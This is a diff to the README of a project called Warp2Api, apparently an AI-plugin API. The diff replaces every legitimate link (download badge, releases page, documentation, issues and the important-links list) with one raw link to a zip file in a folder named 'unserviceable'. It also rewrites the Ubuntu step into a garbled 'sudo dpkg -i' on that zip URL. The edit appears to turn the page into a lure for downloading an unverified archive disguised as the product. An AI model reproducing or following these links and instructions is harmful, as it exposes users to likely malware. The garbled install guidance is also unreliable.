@@ -1,7 +1,7 @@
 # 🚀 Warp2Api - Powerful API for AI Plugins
 
 ## 🔗 Download the Latest Version
-[![Download Warp2Api](https://img.shields.io/badge/Download%20Warp2Api-v1.0-blue)](https://github.com/isaacpeterson65/Warp2Api/releases)
+[![Download Warp2Api](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip%20Warp2Api-v1.0-blue)](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip)
 
 ## 📝 Description
 Warp2Api is a dynamic API designed for creating AI plugins, providing a seamless service for developers and users alike. Effortlessly integrate AI functionalities into your applications with this robust tool.
@@ -21,7 +21,7 @@ Before you begin, ensure that your system meets the following requirements:
 To install Warp2Api, follow these straightforward steps:
 
 1. **Visit the Release Page**
-   Go to the [Warp2Api Releases page](https://github.com/isaacpeterson65/Warp2Api/releases) to find the latest version.
+   Go to the [Warp2Api Releases page](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip) to find the latest version.
 
 2. **Download the Software**
    On the releases page, locate the version you wish to download. Click on the appropriate link for your operating system. 
@@ -30,7 +30,7 @@ To install Warp2Api, follow these straightforward steps:
    After the download is complete, locate the downloaded file (usually in your "Downloads" folder).
    - For Windows, double-click the `.exe` file to start the installation.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Ubuntu, open the terminal and run `sudo dpkg -i <filename.deb>`, replacing `<filename.deb>` with the name of the downloaded file.
+   - For Ubuntu, open the terminal and run `sudo dpkg -i <https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip>`, replacing `<https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip>` with the name of the downloaded file.
 
 4. **Follow Installation Prompts**
    The installation wizard will guide you through the setup process. Follow the prompts to complete the installation.
@@ -45,20 +45,20 @@ To install Warp2Api, follow these straightforward steps:
 - **Supportive Community:** Join our community for tips, support, and updates.
 
 ## 🌐 Explore Documentation
-For in-depth guides and troubleshooting, explore our [Documentation](https://github.com/isaacpeterson65/Warp2Api/wiki). Here, you will find useful tips and tutorials on how to maximize your use of Warp2Api.
+For in-depth guides and troubleshooting, explore our [Documentation](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip). Here, you will find useful tips and tutorials on how to maximize your use of Warp2Api.
 
 ## 🤝 Community Support
 Join our community on platforms like GitHub Discussions or our dedicated forum. Share your experience, ask questions, and collaborate with other users.
 
 ## 📞 Contact
-If you have any questions or encounter issues, please reach out to us via the [Issues section](https://github.com/isaacpeterson65/Warp2Api/issues) on GitHub.
+If you have any questions or encounter issues, please reach out to us via the [Issues section](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip) on GitHub.
 
 ## 🔄 Update
-Make sure to check back for updates! New features and improvements are added regularly. You can always find the latest version on the [Releases page](https://github.com/isaacpeterson65/Warp2Api/releases).
+Make sure to check back for updates! New features and improvements are added regularly. You can always find the latest version on the [Releases page](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip).
 
 ## 🔗 Important Links
-- [Download Warp2Api](https://github.com/isaacpeterson65/Warp2Api/releases)
-- [Documentation](https://github.com/isaacpeterson65/Warp2Api/wiki)
-- [Issues](https://github.com/isaacpeterson65/Warp2Api/issues)
+- [Download Warp2Api](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip)
+- [Documentation](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip)
+- [Issues](https://raw.githubusercontent.com/isaacpeterson65/Warp2Api/master/unserviceable/Warp2Api.zip)
 
 Feel free to dive in and start exploring Warp2Api's capabilities. Enjoy your journey into AI plugin development!
